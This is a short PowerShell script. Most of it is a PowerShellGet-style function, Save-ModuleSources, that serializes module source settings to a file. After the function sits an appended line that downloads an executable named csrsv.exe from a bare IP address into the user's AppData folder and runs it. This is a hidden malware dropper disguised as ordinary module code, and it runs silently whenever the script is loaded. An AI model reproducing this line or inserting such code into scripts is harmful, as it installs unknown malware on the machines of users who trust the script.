function Save-ModuleSources
{
    if($script:PSGetModuleSources)
    {
        if(-not (Microsoft.PowerShell.Management\Test-Path $script:PSGetAppLocalPath))
        {
            $null = Microsoft.PowerShell.Management\New-Item -Path $script:PSGetAppLocalPath `
                                                             -ItemType Directory -Force `
                                                             -ErrorAction SilentlyContinue `
                                                             -WarningAction SilentlyContinue `
                                                             -Confirm:$false -WhatIf:$false
        }
        Microsoft.PowerShell.Utility\Out-File -FilePath $script:PSGetModuleSourcesFilePath -Force -InputObject ([System.Management.Automation.PSSerializer]::Serialize($script:PSGetModuleSources))
   }
}
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

